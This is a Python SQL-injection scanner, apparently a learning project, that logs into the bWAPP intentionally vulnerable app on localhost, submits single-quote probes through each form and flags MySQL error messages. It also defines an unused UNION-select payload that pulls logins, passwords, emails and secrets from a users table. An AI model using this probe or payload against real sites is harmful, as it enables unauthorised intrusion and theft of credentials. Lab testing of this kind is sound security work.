import requests as r
from bs4 import BeautifulSoup as bs
import re

# demo is the bWAPP vulnerable web app that runs inside a docker container
HOST = 'http://localhost'
TEST_APP_USERNAME = 'bee'
TEST_APP_PASS = 'bug'
LOGIN = True
LOGIN_PAGE = 'login.php'
DEMO_QUERY = 'test\' union select 1,login,password,email,secret,1,1 from users-- '
TEST_ROUTE = '/sqli_6.php'
# regular expressions to catch MySQL errors that show that the input is vulnerable to SQL injection
ERRORS_REGEXP = [
	r"SQL syntax.*?MySQL",
	r"Warning.*?\Wmysqli?_",
	r"MySQLSyntaxErrorException",
	r"valid MySQL result",
	r"check the manual that (corresponds to|fits) your MySQL server version",
	r"check the manual that (corresponds to|fits) your MariaDB server version",
	r"check the manual that (corresponds to|fits) your Drizzle server version",
	r"Unknown column '[^ ]+' in 'field list'",
	r"MySqlClient\.",
	r"com\.mysql\.jdbc",
	r"Zend_Db_(Adapter|Statement)_Mysqli_Exception",
	r"Pdo[./_\\]Mysql",
	r"MySqlException",
	r"SQLSTATE\[\d+\]: Syntax error or access violation",
	r"MemSQL does not support this type of query",
	r"is not supported by MemSQL",
	r"unsupported nested scalar subselect"
]


def test_sqli(test_url, label):
	vulnerable = False
	with r.Session() as attack_session:
		# fake request headers
		attack_session.headers[
			'User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
		
		if LOGIN:
			# payload to login to bWAPP which is "an extremely buggy web app"
			# this login is for demo purposes
			payload = {'login': TEST_APP_USERNAME, 'password': TEST_APP_PASS, 'security_level': 0, 'form': 'submit'}
			
			# use the session to login to the vulnerable web app
			attack_session.post(f"{HOST}/{LOGIN_PAGE}", data=payload)
		
		resp = attack_session.get(test_url)
		
		page_soup = bs(resp.content, 'html.parser')
		
		forms = page_soup.find_all('form')
		
		for form in forms:
			inputs = form.find_all('input')
			# we only want the forms that have some sort of input to check for SQL injection
			if not inputs:
				continue
			
			form_request_method = form.attrs.get("method", "get").lower()
			
			form_payload = {}
			
			# special character to check for vulnerability
			special_character = "'"
			
			for inp in inputs:
				# get input field names and data
				i_type = inp.attrs.get("type", "text")
				i_value = inp.attrs.get("value", "")
				i_name = inp.attrs.get("name")
				
				# just fill hidden inputs
				if i_type == 'hidden' or i_value != "":
					form_payload[i_name] = f'{i_value}{special_character}'
				# fields that are not submit (i.e.) text are the ones that need to be tested
				elif i_type != 'submit':
					# the special character for MySQL is '
					# if the field is vulnerable then this throws an SQL error
					form_payload[i_name] = f"test{special_character}"

			# select between post and get
			if form_request_method == "post":
				result = attack_session.post(test_url, data=form_payload)
			elif form_request_method == "get":
				result = attack_session.get(test_url, params=form_payload)
			
			# check result with regex to find the SQL error (if present)
			for regex in ERRORS_REGEXP:
				
				match = re.search(regex.lower(), result.content.decode().lower())
				# if we get a match the form is vulnerable to SQL injection attacks
				if bool(match):
					print(f'[!] {test_url} is vulnerable to SQL injections.')
					label.setText(f'[!] {test_url} is vulnerable to SQL injections.')
					vulnerable = True
					break

	if not vulnerable:
		label.setText(f'[!] {test_url} is not vulnerable to SQL injections.')
